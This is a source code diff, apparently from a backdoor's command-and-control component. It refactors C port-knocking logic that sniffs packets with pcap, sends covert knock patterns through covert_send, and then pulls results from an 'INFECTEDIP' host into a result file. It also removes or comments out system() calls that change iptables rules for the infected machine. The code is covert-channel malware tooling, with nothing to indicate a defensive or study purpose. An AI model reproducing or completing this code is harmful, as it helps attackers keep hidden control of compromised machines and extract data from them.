@@ -4,9 +4,11 @@ struct filter InitFilter(char *target, char *local){
     struct filter Filter;
     Filter.amount = FILTERAMOUNT;
     Filter.port[0] = "8506";
-    Filter.port_short[0] = 14881;
+    Filter.port_short[0] = 8506;
+    Filter.port_ushort[0] = 14881;
     Filter.port[1] = "8507";
-    Filter.port_short[1] = 15137;
+    Filter.port_ushort[1] = 15137;
+    Filter.port_short[1] = 8507;
     strncpy(Filter.targetip, target, BUFFERSIZE);
     strncpy(Filter.localip, local, BUFFERSIZE);
     return Filter;
@@ -46,13 +48,9 @@ void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
     int size_payload;
 
     if(send){
-        char *srcip = INFECTEDIP;
-        char *destip = CNCIP;
-        unsigned short sport = SHPORT;
-        unsigned short dport = SHPORT;
         unsigned char data[BUFSIZE] = "";
         printf("PORT KNOCKING\n");
-        SendPattern(srcip, destip, sport, dport, data, Filter);
+        SendPattern(data, Filter);
     } else {
         //parse the tcp packet and check for key and port knocking packets
         printf("TCP Packet\n");
@@ -81,14 +79,13 @@ void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
             }
         }
         //fix this part
-        if((knocking[0] == 1) && (knocking[1] == 1)){
-            system(IPTABLES(INFECTEDIP));
-            char *dip = INFECTEDIP;
-            unsigned short sport = SHPORT;
-            unsigned short dport = SHPORT;
+        if((Filter.pattern[0] == 1) && (Filter.pattern[1] == 1)){
+            //system(IPTABLES(targetip,"tcp",PORT));
+            char *dip = Filter.targetip;
+            unsigned short dport = (short)PORT;
             printf("WAITING FOR DATA\n");
             recv_results(dip, dport, RESULT_FILE);
-            system(TURNOFF(INFECTEDIP));
+            //system(TURNOFF(INFECTEDIP));
             pcap_breakloop(interfaceinfo);
         }
     }
@@ -96,8 +93,8 @@ void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
 
 }
 
-void SendPattern(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char *data, struct filter Filter){
+void SendPattern(unsigned char *data, struct filter Filter){
     for(int i = 0; i < Filter.amount; i++){
-        covert_send(sip, dip, sport, Filter.port_short[i], data, 2);
+        covert_send(Filter.localip, Filter.targetip, Filter.port_short[i], Filter.port_short[i], data, 2);
     }
 }
